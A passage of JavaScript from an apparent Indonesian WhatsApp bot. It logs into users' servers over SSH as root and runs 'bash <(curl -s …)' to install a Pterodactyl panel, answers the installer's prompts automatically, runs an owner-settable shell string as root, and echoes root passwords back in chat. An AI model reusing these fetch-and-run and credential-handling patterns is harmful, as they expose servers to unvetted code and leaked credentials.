    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'installpanel4-v2': {
 if (!isOwner && !isResinstall) return onlyOwn()
 let t = text.split(',');
 if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel4 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = generateRandomPassword();
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 conn.on('ready', () => {
 rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
 conn.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 var teks = `*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Link Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://${subdomain}\"}"
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"SALIN START WINGS\",\"id\":\"123456789\",\"copy_code\":\".startwings ${ipvps},${passwd},\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('Y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break

case 'installpanel5': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel5 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'installpanel5-v2': {
 if (!isOwner && !isResinstall) return onlyOwn()
 let t = text.split(',');
 if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel5 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = generateRandomPassword();
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 conn.on('ready', () => {
 rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
 conn.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 var teks = `*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Link Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://${subdomain}\"}"
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"SALIN START WINGS\",\"id\":\"123456789\",\"copy_code\":\".startwings ${ipvps},${passwd},\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('Y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break

case 'uninstallpanel': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        rafatharcodereply('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('6\n');
                    } else if (data.toString().includes('y/n')) {
                        stream.write('y\n');
                    } else {
                        stream.write('\n');
                    }
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
            rafatharcodereply('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
        }
   }
    break;

case 'startwings': case 'configurewings': {
    if (!isOwner && !isResinstall) return onlyOwn();
    
    let t = text.split(',');
    if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}startwings ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rafatharcodereply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘 𝗪𝗜𝗡𝗚𝗦')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
rafatharcodereply('𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗧𝗔𝗥𝗧 𝗪𝗜𝗡𝗚𝗦 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗖𝗘𝗞 𝗡𝗢𝗗𝗘 𝗔𝗡𝗗𝗔😁');
                conn.end();
            }).on('data', (data) => {
            stream.write(`${global.tokeninstall}\n`);
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rafatharcodereply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break

case 'upzone' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.zone = `${text}`
rafatharcodereply("_Berhasil Mengganti Zone Domain✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Zone*`)
}
break

case 'upapi' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.apidomain = `${text}`
rafatharcodereply("_Berhasil Mengganti Api Domain✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Api Domain*`)
}
break

case 'uptokeninstall' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.tokeninstall = `${text}`
rafatharcodereply("_Berhasil Mengganti Token All Install✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Token*`)
}
break

case 'uptokeninstall1' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.tokeninstall1 = `${text}`
rafatharcodereply("_Berhasil Mengganti Token All Install 1✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Token*`)
}
break

case 'uptokeninstall2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.tokeninstall2 = `${text}`
rafatharcodereply("_Berhasil Mengganti Token All Install 2✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Token*`)
}
break

case 'updomain' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.domain = `${text}`
rafatharcodereply("_Berhasil Mengganti Domain Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Domain Nya ?*`)
}
break

case 'updomain2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.domain2 = `${text}`
rafatharcodereply("_Berhasil Mengganti Domain2 Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Domain Nya ?*`)
}
break

case 'upapikey' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.apikey = `${text}`
rafatharcodereply("_Berhasil Mengganti Apikey Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Apikey Nya ?*`)
}
break

case 'upapikey2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.apikey2 = `${text}`
rafatharcodereply("_Berhasil Mengganti Apikey2 Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Apikey Nya ?*`)
}
break

case 'upcapikey' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.capikey = `${text}`
rafatharcodereply("_Berhasil Mengganti Capikey Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Capikey Nya ?*`)
}
break

case 'upcapikey2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.capikey2 = `${text}`
rafatharcodereply("_Berhasil Mengganti Capikey2 Panel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Capikey Nya ?*`)
}
break

case 'uphargav1' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscv1 = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Harganya ?*`)
}
break

case 'uphargav2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscv2 = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Hargany ?*`)
}
break

case 'uphargav3' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscv3 = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Harganya ?*`)
}
break

case 'uphargav3up' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscv3up = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Harganya ?*`)
}
break

case 'uphargav3saweria' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscv3saweria = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Harganya ?*`)
}
break

case 'uphargapribadi' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.rbuyscprib = `${text}`
rafatharcodereply("_Berhasil Mengganti Harga Script✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Nominal Harganya ?*`)
}
break

case 'upbashinstall' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.bash = `${text}`
rafatharcodereply("_Berhasil Mengganti All Bash Install✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Bash Nya ?*`)
}
break

case 'upbashinstall1' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.bash1 = `${text}`
rafatharcodereply("_Berhasil Mengganti All Bash Install 1✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Bash Nya ?*`)
}
break

case 'upbashinstall2' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.bash2 = `${text}`
rafatharcodereply("_Berhasil Mengganti All Bash Install 2✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Bash Nya ?*`)
}
break

case 'uplinkmedia' :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isOwner) return onlyOwn()
global.upmedia = `${text}`
